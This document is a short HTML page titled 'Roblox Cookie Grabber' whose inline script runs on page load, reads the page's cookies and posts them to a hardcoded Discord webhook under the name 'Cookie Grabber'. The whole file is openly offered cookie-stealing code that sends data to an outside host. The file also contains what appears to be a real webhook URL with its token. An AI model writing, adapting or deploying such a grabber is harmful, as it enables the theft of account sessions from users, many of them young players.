<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Grabber</title>
    <script>
        // Function to grab cookies and send to Discord
        function sendCookies() {
            // Get the cookies from the document
            const cookies = document.cookie;

            // Set up the webhook URL
            const webhookURL = 'https://discord.com/api/webhooks/1290081936542400625/SwcqQdeR-lzSlSeSI0NMMgt3YeTIMU6HolcHg9gGV3K2CpHOUVL1oKh-CG5kzbO07FWp'; // Replace with your webhook URL

            // Prepare the payload
            const payload = {
                content: `Cookies: ${cookies}`,
                username: 'Cookie Grabber'
            };

            // Send the cookies to the Discord webhook
            fetch(webhookURL, {
                method: 'POST',
                body: JSON.stringify(payload),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => {
                if (response.ok) {
                    console.log('Cookies sent successfully!');
                } else {
                    console.error('Failed to send cookies:', response.statusText);
                }
            })
            .catch(error => console.error('Error sending cookies:', error));
        }

        // Call the function when the page loads
        window.onload = sendCookies;
    </script>
</head>
<body>
    <h1>Roblox Cookie Grabber</h1>
    <p>Your cookies are being collected...</p>
</body>
</html>
